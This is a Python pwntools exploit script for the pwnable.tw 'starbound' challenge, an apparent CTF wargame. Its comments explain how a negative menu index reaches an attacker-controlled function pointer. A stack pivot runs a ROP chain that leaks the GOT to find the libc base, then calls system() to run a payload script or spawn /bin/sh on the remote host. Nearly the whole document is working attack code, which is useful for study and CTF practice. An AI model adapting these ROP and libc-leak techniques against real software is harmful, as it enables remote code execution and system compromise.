import pwnlib.libcdb
import rich

from pwn import *
from dataclasses import dataclass

LOCAL = "--local" in sys.argv
DEBUG = LOCAL and "--debug" in sys.argv
INTERACTIVE = "--interactive" in sys.argv
if LOCAL:
    p = process("./starbound")
else:
    p = remote("chall.pwnable.tw", 10202)

elf = ELF("./starbound", checksec=False)


@dataclass
class GotEntry:
    addr: int
    resolved: bool


@dataclass
class GotTable:
    entries: dict[str, GotEntry]

    def get(self, sym: str) -> GotEntry:
        return self.entries[sym]

    def __getitem__(self, sym: str) -> GotEntry:
        return self.get(sym)

    def __len__(self):
        return len(self.entries)


GOT_BASE = 0x805500C
GOT_ENTRY_COUNT = 42
MAIN_ADDR = 0x0804A605
PLAYER_NAME_ADDR = 0x080580D0
if LOCAL:
    LIBC_SYSTEM_OFFSET = 0x48170
    LIBC_OPEN_OFFSET = 0x109BF0
else:
    # libc6_2.23-0ubuntu5_i386 (got from https://libc.rip after leaking the GOT).
    LIBC_OPEN_OFFSET = 0xD5570
    LIBC_SYSTEM_OFFSET = 0x3ADA0

# stack pivot gadget
# add esp, 28 ; ret
add_esp_0x1c_ret = 0x0804926D


def rop(chain: bytes, additional_name_data: bytes = b""):
    # handlers_array_addr = 0x08058154
    # (player_name_addr - handlers_array_addr) // 4 == -33
    #
    # the vulnerability is that the menu choice is parsed with strtol(),
    # which allows us to input negative values. we can then trigger handlers[-33], actually
    # take the handler address from the first 4 bytes of the player name buffer, which we
    # control using the settings menu.
    #
    # Change the name. Write there the address of the stack pivot gadget.
    # This gadget will start execute the ROP chain that is written in the choice buffer of main() stack frame.
    p.sendlineafter(b"> ", b"6")  # settings
    p.sendlineafter(b"> ", b"2")  # set name
    p.sendlineafter(b"Enter your name: ", p32(add_esp_0x1c_ret) + additional_name_data)
    p.sendlineafter(b"> ", b"-33\x00JUNK" + flat(chain))


def read_got_from_stdout() -> GotTable:
    entries = {}
    for i in range(GOT_ENTRY_COUNT):
        addr = u32(p.recv(4))
        sym = [key for key, value in elf.got.items() if value == GOT_BASE + i * 4][0]
        resolved = addr & elf.address != elf.address
        entries[sym] = GotEntry(addr, resolved)

    return GotTable(entries)


def get_libc_base(got: GotTable):
    # I printed all the GOT entries, then went to https://libc.rip to find the libc version that the binary is loaded with.
    # That got me the offsets for system and open, so I could get the libc base and system() address.
    rich.print(got)

    open_entry = got.get("open")
    if not open_entry.resolved:
        error("Open entry is not resolved")

    libc_base = open_entry.addr - LIBC_OPEN_OFFSET
    if libc_base % 0x1000 != 0:
        error("Calculated libc is wrong. Exploit failed.")
    return libc_base


def exploit():
    info("Executing first ROP to leak the entire GOT...")
    rop(
        [
            p32(elf.plt["write"]),
            # return to execute main() again
            p32(MAIN_ADDR),
            # fd == stdout
            p32(1),
            # buf == GOT_BASE
            p32(GOT_BASE),
            # size == GOT_ENTRY_COUNT * 4
            p32(GOT_ENTRY_COUNT * 4),
        ]
    )

    got = read_got_from_stdout()
    libc_base = get_libc_base(got)
    system_addr = libc_base + LIBC_SYSTEM_OFFSET
    info(f"libc base: {libc_base:#x}")
    info(f"system: {system_addr:#x}")

    with open("payload.sh", "rb") as f:
        script = f.read() + b"\x00"

    if INTERACTIVE:
        script = b"/bin/sh\x00"

    info(f"Executing system({script})")
    add_esp_8_pop_ebx_ret = 0x08048936
    bss_start = elf.bss()
    MAX_PAYLOAD_LEN = 0x440  # .bss size
    if len(script) > MAX_PAYLOAD_LEN:
        error("Payload is too big")
    # 0x0002f6ac : mov eax, ecx ; ret
    # libc gadgets (local)
    # 0x000c9f88 : mov ecx, eax ; mov eax, ecx ; ret
    # 0x00037765 : int 0x80
    # 0x000347ce : jmp ecx
    # 0x08053723 jmp eax -> we can call mmap() to allocate executable memory and then

    if DEBUG:
        gdb.attach(p)

    rop(
        [
            p32(got.get("read").addr),  # read
            p32(add_esp_8_pop_ebx_ret),  # read ret
            p32(0),  # stdin
            p32(bss_start),  # buf
            p32(4096),  # size
            p32(system_addr),
            p32(0xDEADBEEF),
            p32(bss_start),
        ],
    )

    p.send(script)
    p.interactive()


exploit()
